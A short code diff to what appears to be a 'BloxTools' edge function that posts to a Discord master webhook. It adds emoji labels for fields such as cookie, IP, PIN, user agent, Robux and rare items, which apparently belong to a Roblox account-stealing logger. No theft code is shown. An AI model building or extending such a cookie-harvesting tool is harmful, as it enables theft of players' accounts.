@@ -23,6 +23,35 @@ const MASTER_WEBHOOK =
 
 const SITE_NAME = "BloxTools";
 
+// Discord emoji overrides — KEEP IN SYNC with src/config/toolsConfig.ts > discordEmojis
+// Edge functions cannot import from src/, so this is mirrored here.
+const EMOJI = {
+  robux:    "<:7116_Robux:1498757858731360349>",
+  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
+  rap:      "💎",
+  summary:  "📊",
+  pending:  "⏳",
+  voice:    "🎤",
+  age:      "🪪",
+  korblox:  "💀",
+  headless: "👑",
+  groups:   "👑",
+  games:    "🎮",
+  cookie:   "🍪",
+  ip:       "🌐",
+  user:     "👤",
+  id:       "🆔",
+  age_acct: "📅",
+  friends:  "🫂",
+  followers:"👥",
+  following:"➡️",
+  ua:       "🖥️",
+  time:     "⏰",
+  pin:      "🔐",
+  owner:    "🏷️",
+};
+
+
 // Roblox bundle IDs
 const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
 const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman
